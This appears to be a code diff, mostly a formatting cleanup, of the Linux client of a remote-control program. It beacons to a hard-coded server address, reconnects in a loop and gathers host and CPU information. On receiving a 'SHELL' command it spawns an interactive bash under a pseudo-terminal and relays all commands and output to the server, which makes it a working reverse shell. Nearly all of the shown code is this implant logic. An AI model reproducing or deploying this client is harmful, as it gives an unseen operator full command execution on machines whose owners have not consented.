@@ -26,103 +26,113 @@ CONNECT_ADDRESS g_SETTINGS = {FLAG_GHOST, "192.168.0.92", "6543", CLIENT_TYPE_LI
 State g_bExit = S_CLIENT_NORMAL;
 
 // 伪终端处理类：继承自IOCPManager.
-class PTYHandler : public IOCPManager {
-    public:
-        PTYHandler(IOCPClient *client) : m_client(client), m_running(false) {
-            if (!client) {
-                throw std::invalid_argument("IOCPClient pointer cannot be null");
-            }
-    
-            // 创建伪终端
-            if (openpty(&m_master_fd, &m_slave_fd, nullptr, nullptr, nullptr) == -1) {
-                throw std::runtime_error("Failed to create pseudo terminal");
-            }
-    
-            // 设置伪终端为非阻塞模式
-            int flags = fcntl(m_master_fd, F_GETFL, 0);
-            fcntl(m_master_fd, F_SETFL, flags | O_NONBLOCK);
-    
-            // 启动 Shell 进程
-            startShell();
+class PTYHandler : public IOCPManager
+{
+public:
+    PTYHandler(IOCPClient *client) : m_client(client), m_running(false)
+    {
+        if (!client) {
+            throw std::invalid_argument("IOCPClient pointer cannot be null");
         }
-    
-        ~PTYHandler() {
-            m_running = false;
-            if (m_readThread.joinable()) m_readThread.join();
+
+        // 创建伪终端
+        if (openpty(&m_master_fd, &m_slave_fd, nullptr, nullptr, nullptr) == -1) {
+            throw std::runtime_error("Failed to create pseudo terminal");
+        }
+
+        // 设置伪终端为非阻塞模式
+        int flags = fcntl(m_master_fd, F_GETFL, 0);
+        fcntl(m_master_fd, F_SETFL, flags | O_NONBLOCK);
+
+        // 启动 Shell 进程
+        startShell();
+    }
+
+    ~PTYHandler()
+    {
+        m_running = false;
+        if (m_readThread.joinable()) m_readThread.join();
+        close(m_master_fd);
+        close(m_slave_fd);
+    }
+
+    // 启动读取线程
+    void Start()
+    {
+        if (m_running) return;
+        m_running = true;
+        m_readThread = std::thread(&PTYHandler::readFromPTY, this);
+    }
+
+    virtual VOID OnReceive(PBYTE data, ULONG size)
+    {
+        if (size && data[0] == COMMAND_NEXT) {
+            Start();
+            return;
+        }
+        std::string s((char*)data, size);
+        Mprintf(s.c_str());
+        std::lock_guard<std::mutex> lock(m_mutex);
+        if (size > 0) {
+            write(m_master_fd, (char*)data, size);
+        }
+    }
+private:
+    int m_master_fd, m_slave_fd;
+    IOCPClient *m_client;
+    std::thread m_readThread;
+    std::atomic<bool> m_running;
+    std::mutex m_mutex;
+    pid_t m_child_pid;
+
+    void startShell()
+    {
+        m_child_pid = fork();
+        if (m_child_pid == 0) {  // 子进程
+            setsid();  // 创建新的会话
+            dup2(m_slave_fd, STDIN_FILENO);
+            dup2(m_slave_fd, STDOUT_FILENO);
+            dup2(m_slave_fd, STDERR_FILENO);
             close(m_master_fd);
             close(m_slave_fd);
-        }
-        
-        // 启动读取线程
-        void Start(){
-            if (m_running) return;
-            m_running = true;
-            m_readThread = std::thread(&PTYHandler::readFromPTY, this);
-        }
 
-        virtual VOID OnReceive(PBYTE data, ULONG size) {
-            if (size && data[0] == COMMAND_NEXT){
-                Start();
-                return;
-            }
-            std::string s((char*)data, size); Mprintf(s.c_str());
-            std::lock_guard<std::mutex> lock(m_mutex);
-            if (size > 0) {
-                write(m_master_fd, (char*)data, size);
-            }
+            // 关闭回显、禁用 ANSI 颜色、关闭 PS1
+            const char* shell_cmd =
+                "stty -echo -icanon; "  // 禁用回显和规范模式
+                "export TERM=dumb; "    // 设置终端类型为 dumb
+                "export LS_COLORS=''; " // 禁用颜色
+                "export PS1='>'; "      // 设置提示符
+                //"clear; "             // 清空终端
+                "exec /bin/bash --norc --noprofile -i";  // 启动 Bash
+            execl("/bin/bash", "/bin/bash", "-c", shell_cmd, nullptr);
+            exit(1);
         }
-    private:
-        int m_master_fd, m_slave_fd;
-        IOCPClient *m_client;
-        std::thread m_readThread;
-        std::atomic<bool> m_running;
-        std::mutex m_mutex;
-        pid_t m_child_pid;
-    
-        void startShell() {
-            m_child_pid = fork();
-            if (m_child_pid == 0) {  // 子进程
-                setsid();  // 创建新的会话
-                dup2(m_slave_fd, STDIN_FILENO);
-                dup2(m_slave_fd, STDOUT_FILENO);
-                dup2(m_slave_fd, STDERR_FILENO);
-                close(m_master_fd);
-                close(m_slave_fd);
+    }
 
-                // 关闭回显、禁用 ANSI 颜色、关闭 PS1
-                const char* shell_cmd = 
-                    "stty -echo -icanon; "  // 禁用回显和规范模式
-                    "export TERM=dumb; "    // 设置终端类型为 dumb
-                    "export LS_COLORS=''; " // 禁用颜色
-                    "export PS1='>'; "      // 设置提示符
-                    //"clear; "             // 清空终端
-                    "exec /bin/bash --norc --noprofile -i";  // 启动 Bash
-                execl("/bin/bash", "/bin/bash", "-c", shell_cmd, nullptr);
-                exit(1);
+    void readFromPTY()
+    {
+        char buffer[4096];
+        while (m_running) {
+            ssize_t bytes_read = 0;
+            {
+                std::lock_guard<std::mutex> lock(m_mutex);
+                bytes_read = read(m_master_fd, buffer, sizeof(buffer));
             }
-        }
-    
-        void readFromPTY() {
-            char buffer[4096];
-            while (m_running) {
-                ssize_t bytes_read = 0;
-                {
-                    std::lock_guard<std::mutex> lock(m_mutex);
-                    bytes_read = read(m_master_fd, buffer, sizeof(buffer));
+            if (bytes_read > 0) {
+                if (m_client) {
+                    buffer[bytes_read] = 0;
+                    Mprintf(buffer);
+                    m_client->Send2Server(buffer, bytes_read);
                 }
-                if (bytes_read > 0) {
-                    if (m_client) {
-                        buffer[bytes_read] = 0; Mprintf(buffer);
-                        m_client->Send2Server(buffer, bytes_read);
-                    }
-                } else if (bytes_read == -1) {
-                    usleep(10000);
-                }
+            } else if (bytes_read == -1) {
+                usleep(10000);
             }
         }
-    };
+    }
+};
 
-void *ShellworkingThread(void *param){
+void *ShellworkingThread(void *param)
+{
     IOCPClient  *ClientObject = new IOCPClient(g_bExit, true);
     Mprintf(">>> Enter ShellworkingThread [%p]\n", ClientObject);
     if ( !g_bExit && ClientObject->ConnectServer(g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort())) {
@@ -141,27 +151,29 @@ void *ShellworkingThread(void *param){
     return NULL;
 }
 
-int DataProcess(void* user, PBYTE szBuffer, ULONG ulLength) {
+int DataProcess(void* user, PBYTE szBuffer, ULONG ulLength)
+{
     if (szBuffer==nullptr || ulLength ==0)
         return TRUE;
 
     if (szBuffer[0] == COMMAND_BYE) {
         Mprintf("*** [%p] Received Bye-Bye command ***\n", user);
         g_bExit = S_CLIENT_EXIT;
-    }else if (szBuffer[0] == COMMAND_SHELL){
+    } else if (szBuffer[0] == COMMAND_SHELL) {
         pthread_t id = 0;
         HANDLE m_hWorkThread = (HANDLE)pthread_create(&id, nullptr, ShellworkingThread, nullptr);
         Mprintf("** [%p] Received 'SHELL' command ***\n", user);
-    }else if (szBuffer[0]==COMMAND_NEXT){
+    } else if (szBuffer[0]==COMMAND_NEXT) {
         Mprintf("** [%p] Received 'NEXT' command ***\n", user);
-    }else {
+    } else {
         Mprintf("** [%p] Received unimplemented command: %d ***\n", user, int(szBuffer[0]));
     }
     return TRUE;
 }
 
 // 方法1: 解析 lscpu 命令（优先使用）
-double parse_lscpu() {
+double parse_lscpu()
+{
     std::array<char, 128> buffer;
     std::string result;
     std::unique_ptr<FILE, decltype(&pclose)> pipe(popen("lscpu", "r"), pclose);
@@ -181,7 +193,8 @@ double parse_lscpu() {
 }
 
 // 方法2: 解析 /proc/cpuinfo（备用）
-double parse_cpuinfo() {
+double parse_cpuinfo()
+{
     std::ifstream cpuinfo("/proc/cpuinfo");
     std::string line;
     std::regex freq_regex("@ ([0-9.]+)GHz");
@@ -198,14 +211,15 @@ double parse_cpuinfo() {
 }
 
 // 一个基于Linux操作系统实现的受控程序例子: 当前只实现了注册、删除和终端功能.
-int main() {
-    char hostname[256]={}; 
+int main()
+{
+    char hostname[256]= {};
     if (gethostname(hostname, sizeof(hostname)) == 0) {
         std::cout << "Hostname: " << hostname << std::endl;
     } else {
         std::cerr << "Failed to get hostname" << std::endl;
     }
-    struct utsname systemInfo={};
+    struct utsname systemInfo= {};
     if (uname(&systemInfo) == 0) {
         std::cout << "System Name: " << systemInfo.sysname << std::endl;
     } else {
@@ -224,10 +238,9 @@ int main() {
 
     IOCPClient  *ClientObject = new IOCPClient(g_bExit, false);
     ClientObject->setManagerCallBack(NULL, DataProcess);
-    while (!g_bExit)
-    {
+    while (!g_bExit) {
         clock_t c = clock();
-        if (!ClientObject->ConnectServer(g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort())){
+        if (!ClientObject->ConnectServer(g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort())) {
             Sleep(5000);
         }
 
@@ -237,7 +250,7 @@ int main() {
             Sleep(5000);
         } while (ClientObject->IsRunning() && ClientObject->IsConnected() && S_CLIENT_NORMAL==g_bExit);
     }
-    
+
     delete ClientObject;
 
     return 0;
